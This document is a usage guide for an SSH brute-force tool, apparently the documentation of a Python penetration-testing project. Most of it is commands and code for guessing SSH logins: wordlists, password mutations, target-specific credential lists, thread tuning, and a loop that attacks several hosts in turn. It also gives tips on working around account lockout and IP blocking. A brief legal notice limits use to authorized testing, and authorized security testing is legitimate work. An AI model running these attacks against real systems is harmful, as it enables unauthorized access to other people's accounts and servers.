# Usage Guide

This guide covers how to use the SSH Bruteforce Tool effectively and safely.

## ⚠️ Important Legal Notice

**This tool is for educational and authorized security testing purposes only!**

- Only use on systems you own or have explicit written permission to test
- Unauthorized access to computer systems is illegal
- Always follow responsible disclosure practices
- The developers are not responsible for misuse of this tool

## Basic Usage

### Command Line Interface

The simplest way to use the tool:

```bash
python -m src.ssh_bruteforce 192.168.1.100
```

### Basic Python Usage

```python
from src.ssh_bruteforce import SSHBruteforce

# Create bruteforce instance
bruteforcer = SSHBruteforce("192.168.1.100")

# Run attack with default settings
bruteforcer.run()
```

## Command Line Options

```bash
python -m src.ssh_bruteforce [OPTIONS] TARGET

Options:
  -p, --port PORT          SSH port (default: 22)
  -u, --userlist FILE      Username wordlist file
  -P, --passlist FILE      Password wordlist file
  -t, --threads NUM        Number of threads (default: 10)
  --timeout SECONDS        Connection timeout (default: 5)
  -h, --help              Show help message
```

### Examples

**Basic attack:**

```bash
python -m src.ssh_bruteforce 192.168.1.100
```

**Custom port:**

```bash
python -m src.ssh_bruteforce 192.168.1.100 -p 2222
```

**Custom wordlists:**

```bash
python -m src.ssh_bruteforce 192.168.1.100 -u wordlists/custom_users.txt -P wordlists/custom_passwords.txt
```

**Multiple threads:**

```bash
python -m src.ssh_bruteforce 192.168.1.100 -t 20
```

**Custom timeout:**

```bash
python -m src.ssh_bruteforce 192.168.1.100 --timeout 10
```

## Python API Usage

### Basic Usage

```python
from src.ssh_bruteforce import SSHBruteforce

# Initialize
bruteforcer = SSHBruteforce(
    target_host="192.168.1.100",
    port=22,
    timeout=5,
    max_threads=10
)

# Run attack
bruteforcer.run()

# Check results
if bruteforcer.found_credentials:
    for username, password in bruteforcer.found_credentials:
        print(f"Found: {username}:{password}")
```

### Advanced Usage

```python
from src.ssh_bruteforce import SSHBruteforce
from src.config import Config
from src.utils.wordlist_manager import WordlistManager

# Load configuration
config = Config()
config.set('bruteforce.max_threads', 15)
config.set('ssh.timeout', 3)

# Create custom wordlists
wm = WordlistManager()
custom_users = ["admin", "root", "administrator"]
wm.create_custom_wordlist(custom_users, "custom/my_users.txt")

# Run attack with custom settings
bruteforcer = SSHBruteforce(
    target_host="192.168.1.100",
    port=22,
    timeout=config.get('ssh.timeout'),
    max_threads=config.get('bruteforce.max_threads')
)

bruteforcer.run(
    userlist_file="wordlists/custom/my_users.txt",
    passlist_file="wordlists/common_passwords.txt"
)
```

## Wordlist Management

### Using Built-in Wordlists

The tool comes with several built-in wordlists:

- `wordlists/common_users.txt` - Common usernames
- `wordlists/common_passwords.txt` - Common passwords
- `wordlists/default_creds.txt` - Default username:password combinations

### Creating Custom Wordlists

```python
from src.utils.wordlist_manager import WordlistManager

wm = WordlistManager()

# Create custom user list
users = ["admin", "administrator", "root", "user"]
wm.create_custom_wordlist(users, "custom/target_users.txt")

# Generate password mutations
base_passwords = ["password", "admin"]
mutated = wm.generate_mutations(base_passwords)
wm.create_custom_wordlist(mutated, "custom/mutated_passwords.txt")

# Merge existing wordlists
wm.merge_wordlists(
    ["common_users.txt", "custom/target_users.txt"],
    "custom/merged_users.txt",
    remove_duplicates=True
)
```

### Wordlist Statistics

```python
from src.utils.wordlist_manager import WordlistManager

wm = WordlistManager()
passwords = wm.load_wordlist("common_passwords.txt")

stats = wm.get_wordlist_stats(passwords)
print(f"Total passwords: {stats['count']}")
print(f"Average length: {stats['avg_length']:.1f}")
print(f"Min/Max length: {stats['min_length']}/{stats['max_length']}")
```

## Attack Strategies

### 1. Default Credentials Phase

Start with default/common credentials:

```python
bruteforcer = SSHBruteforce("192.168.1.100", max_threads=3, timeout=2)
bruteforcer.run()  # Uses default credentials
```

### 2. Common Credentials Phase

Use common username/password combinations:

```python
bruteforcer.run(
    userlist_file="wordlists/common_users.txt",
    passlist_file="wordlists/common_passwords.txt"
)
```

### 3. Target-Specific Phase

Create wordlists specific to your target:

```python
# Company: ACME Corp, Server: web01
wm = WordlistManager()
target_users = ["admin", "acme", "acmeadmin", "web01", "webmaster"]
target_passwords = wm.generate_mutations(["acme", "web01", "password"])

wm.create_custom_wordlist(target_users, "custom/acme_users.txt")
wm.create_custom_wordlist(target_passwords, "custom/acme_passwords.txt")

bruteforcer.run("wordlists/custom/acme_users.txt", "wordlists/custom/acme_passwords.txt")
```

## Output and Logging

### Console Output

The tool provides real-time feedback:

- Progress bar showing current attempt
- Success messages in green
- Error messages in red
- Statistics at completion

### Log Files

Logs are automatically saved to the `logs/` directory:

- `logs/ssh_bruteforce.log` - Main log file
- `logs/successful_logins.txt` - Found credentials only

### Accessing Results

```python
# After running attack
results = bruteforcer.found_credentials
attempts = bruteforcer.attempts

print(f"Found {len(results)} valid credentials in {attempts} attempts")
for username, password in results:
    print(f"  {username}:{password}")
```

## Performance Tuning

### Thread Configuration

```python
# Conservative (slower, less load on target)
bruteforcer = SSHBruteforce("target", max_threads=3, timeout=10)

# Aggressive (faster, more load on target)
bruteforcer = SSHBruteforce("target", max_threads=20, timeout=2)

# Balanced (recommended)
bruteforcer = SSHBruteforce("target", max_threads=10, timeout=5)
```

### Timeout Settings

- **Low timeout (1-2s)**: For fast local networks
- **Medium timeout (5s)**: For most scenarios
- **High timeout (10s+)**: For slow/unreliable connections

### Rate Limiting

Configure delays between attempts:

```python
from src.config import Config

config = Config()
config.set('bruteforce.delay_between_attempts', 0.5)  # 500ms delay
```

## Error Handling

### Common Errors and Solutions

**Connection refused:**

- Check if SSH service is running on target
- Verify correct IP address and port
- Check firewall rules

**Timeout errors:**

- Increase timeout value
- Reduce number of threads
- Check network connectivity

**Authentication errors:**

- Normal during bruteforce attacks
- Indicates wrong credentials (expected)

**Permission denied:**

- Target may have account lockout policies
- Consider using delays between attempts
- Check if your IP is blocked

## Best Practices

### 1. Start Small

Begin with a few threads and short wordlists to test connectivity.

### 2. Use Delays

Add delays between attempts to avoid overwhelming the target:

```python
config.set('bruteforce.delay_between_attempts', 0.2)
```

### 3. Monitor Logs

Regularly check log files for errors or unexpected behavior.

### 4. Progressive Approach

Use multiple phases with increasing aggressiveness:

1. Default credentials
2. Common credentials
3. Target-specific credentials
4. Extended wordlists

### 5. Respect Rate Limits

Don't overwhelm the target system:

- Use reasonable thread counts
- Implement delays
- Monitor system resources

## Integration Examples

### With Other Tools

```python
# Save results for other tools
results = bruteforcer.found_credentials
with open("found_creds.txt", "w") as f:
    for user, password in results:
        f.write(f"{user}:{password}\n")
```

### Automation Scripts

```python
# Automated testing of multiple targets
targets = ["192.168.1.100", "192.168.1.101", "192.168.1.102"]

for target in targets:
    print(f"Testing {target}...")
    bruteforcer = SSHBruteforce(target, max_threads=5)
    bruteforcer.run()

    if bruteforcer.found_credentials:
        print(f"Success on {target}!")
        # Save results, send notifications, etc.
```

## Troubleshooting

### No Results Found

- Verify target is reachable
- Check if correct port is being used
- Ensure wordlists contain valid credentials
- Try increasing timeout values

### Poor Performance

- Reduce number of threads
- Increase timeouts
- Check network latency
- Verify system resources

### Connection Issues

- Test manual SSH connection first
- Check firewall rules
- Verify SSH service is running
- Try different ports

## Next Steps

- See [Configuration Guide](configuration.md) for advanced settings
- Check [Examples](../examples/) for practical scenarios
- Review [Installation Guide](installation.md) for setup issues
